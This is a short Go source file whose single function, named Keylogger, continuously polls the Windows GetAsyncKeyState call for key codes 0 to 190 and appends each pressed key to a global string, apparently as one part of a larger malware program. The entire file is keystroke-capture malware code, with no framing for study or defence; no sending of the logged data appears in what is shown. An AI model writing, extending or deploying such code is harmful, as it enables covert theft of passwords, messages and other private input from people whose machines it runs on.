package main

var KeyLogs string

func Keylogger() {
	for {
		for KEY := 0; KEY <= 190; KEY++ {
			Val, _, _ := GetAsyncKeyState.Call(uintptr(KEY))
			if int(Val) == -32767 {
				KeyLogs += string(KEY)
			}
		}
	}
}
